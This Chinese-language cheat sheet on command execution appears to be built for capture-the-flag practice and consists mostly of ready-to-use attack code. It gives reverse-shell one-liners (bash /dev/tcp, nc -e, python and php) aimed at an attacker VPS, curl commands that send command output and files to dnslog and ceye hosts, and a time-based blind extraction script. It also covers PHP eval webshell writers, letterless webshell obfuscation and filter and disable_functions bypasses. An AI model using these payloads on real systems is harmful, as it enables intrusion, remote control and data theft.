# 01-RCE命令执行

## 总览

> **通路**: ① 直接执行 / ⑤ 反弹 shell\
> **来源**: `命令执行.md` (3463 行) + 网络补充

***

## 一、反弹 Shell（最优先，无需 web 目录）

```bash
# bash（最常用）
bash -c "bash -i >& /dev/tcp/VPS_IP/PORT 0>&1"

# base64 编码版（避开特殊字符 / 数组版 java 源码场景）
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMyAwPiYx}|{base64,-d}|{bash,-i}

# nc
nc -e /bin/bash VPS_IP PORT                    # Linux 靶机
nc -e cmd VPS_IP PORT                          # Windows 靶机（需上传 nc）
nc -lvvnp PORT                                 # 攻击机监听

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# php
php -r '$s=fsockopen("IP",PORT);$d=[0=>$s,1=>$s,2=>$s];proc_open("/bin/sh -i",$d,$p);'

# 写 shell.sh 后执行
echo 'bash -i >& /dev/tcp/VPS_IP/PORT 0>&1' > shell.sh && ./shell.sh
```

**准则**: 谁被动谁监听。内网靶机只能反向连（靶机主动连 VPS）。\
出处: `命令执行.md` L499-L598

### 正向 vs 反向

* **正向连接**: 攻击机主动连靶机（靶机需可路由）
* **反向连接**: 靶机主动连攻击机（内网首选，公网 VPS 可达）

***

## 二、无回显 RCE — 4 种结果带出

```bash
# 1. DNS 外带（dnslog）
curl http://`whoami`.dnslog.cn/
ping `whoami`.your-dnslog.com

# 2. HTTP 外带（ceye 推荐，更稳定）
curl http://ceye.io/`whoami`
curl http://ceye.io/`ls / | base64`              # 多行需 base64
curl http://ceye.io/`whoami | sed -n '2p'`       # 指定行
curl -T /flag http://ceye.io/                    # 文件外带

# 3. 时间盲注
if [ $(cat /flag|cut -c1) = 'f' ]; then sleep 3; fi
```

自动化盲注脚本（`命令执行.md` L666）：

```python
import requests, string, time
url='http://target/?c='
dic=string.printable[:-6]; flag=''
for i in range(1,50):
    judge=0
    for j in dic:
        now=f'{url}a=$(cat /flag | head -1 | cut -b {i});if [ $a = {j} ];then sleep 2;fi'
        start=time.time(); requests.get(now); end=time.time()
        if int(end)-int(start) > 1:
            judge=1; flag+=j; print(flag); break
    if judge==0: break
print(flag)
```

### 数据写出（落地后访问）

```bash
cp flag.php 1.txt        # 复制
mv flag.php 1.txt        # 移动
ls > 1.txt               # 重定向
ls | tee 1.txt           # tee：写文件同时输出
ls | script 1.txt        # script：记录命令状态与结果
```

***

## 三、命令行写马

```bash
# base64 落地（推荐，避开特殊字符）
echo 'PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=' | base64 -d > ./123.php
# 内容: <?php eval($_POST[1]);?>

echo '<?php eval(\$_GET[1]);phpinfo();?>' > /var/www/html/2.php
```

出处: `命令执行.md` L722 / L572

***

## 四、无字母数字 Webshell ★高频考点

出处: `命令执行.md` L2924-L3018

### 4.1 异或构造

```php
// assert($_POST[_])
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');  // 'assert'
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');                     // '_POST'
$___=$$__;
$_($___[_]);   // assert($_POST[_])
```

### 4.2 取反构造

```php
$_=~(%8F%97%8F%96%91%99%90);   // 'phpinfo'
$__=~(%A0%AF%B0%AC%AB);        // '_GET'
$___=$$__;
$_($___[_]);
```

### 4.3 自增构造

```php
// 'a'++ => 'b'，用未定义变量自增拼出函数名（大小写不敏感）
$_=[].'';              // $_ 为 ''
$_=$_['!'=='@'];       // 通过比较 + 自增拿 'a'，逐位拼出 ASSERT
```

### 4.4 或运算 / 临时文件上传

```php
// 或运算构造（'A'|'B' 形式）
// 临时文件上传绕过（无字母数字时上传临时文件 + 短标签包含）
```

### 4.5 参数获取的替代函数

当 `$_GET[1]` 不可用时：

* `get_defined_vars()`
* `getallheaders()`
* `session_id()`\
  出处: `命令执行.md` L1535-L1620

***

## 五、Bypass 过滤汇总

| 过滤点 | 绕过手法 | 出处 |
| --- | --- | --- |
| **空格** | `$IFS` `${IFS}` `$IFS$9` `<` `<>` `{cat,flag}` `%09` | L92 |
| **关键字** | `fl\ag` / `fl''ag` / `fl""ag` / `f[l]ag` / `f?ag` / `fla*` | L109 |
| **变量拼接** | `a=fl;b=ag;cat $a$b.php` | L109 |
| **cat 被禁** | `tac nl more less head tail sort rev od xxd` | L132 |
| **base64 编码** | `echo Y2F0IGZsYWcucGhw|base64 -d|bash` | L797 |
| **hex 编码** | `echo 636174...|xxd -r -p|bash` | L807 |
| **printf 转义** | `printf "\x74\x61\x63\x20..."|bash` | L2026 |
| **单双引号** | `c'a't fla'g'` | L826 |
| **反斜杠** | `c\at fl\ag` | L835 |
| **IP 中句点** | `127.0.0.1` → 十进制/八进制/hex | L843 |
| **内联执行** | `` `command` `` `$(command)` | L871 |
| **黑洞绕过** | `cat flag > /dev/null` 等 | L878 |

### PATH 截断拼接（L2509）

```bash
${PATH:5:1}   # l
${PATH:2:1}   # s
${PATH:5:1}${PATH:2:1}   # ls
```

### 长度限制绕过（L2085-L2208）

```bash
ls -t                              # 按时间排序，最新文件在最前
>文件                               # 用文件名当命令（shell 把文件名当命令执行）
ls -t > 1                          # 把结果写进 1 文件
sh 1                               # 执行
# 长度 7 / 长度 5 绕过见 L2162 / L2183
```

### disable\_functions 绕过

* **LD\_PRELOAD 劫持**（L1746）：编译恶意 .so 劫持 `execve`，配合 `mail()` 等调用
* **蚁剑 + pcntl 插件**（L1872）：PHP 7.x 下用 `pcntl_exec` 绕过禁用
* 其他：`ShellShock`、`iconv`、`imap_open`、`Apache Mod CGI`、`GC UAF`（PHP 7.0-7.3）

***

## 六、常见命令执行函数

```php
system()        // 回显完整结果
passthru()      // 回显原始输出
exec()          // 返回最后一行（需 var_dump 打印）
shell_exec()    // 返回完整输出（需 echo）
popen()         // 打开进程管道
proc_open()     // 更复杂的进程控制
pcntl_exec()    // 需 pcntl 扩展
```

命令拼接符（`命令执行.md` L75）：

```bash
cmd1 | cmd2    # 管道：都执行，只返回后者结果
cmd1 || cmd2   # OR：前者失败才执行后者
cmd1 & cmd2    # 并行：都执行
cmd1 && cmd2   # AND：前者成功才执行后者
cmd1 ; cmd2    # 顺序：都执行（Linux 独有）
```
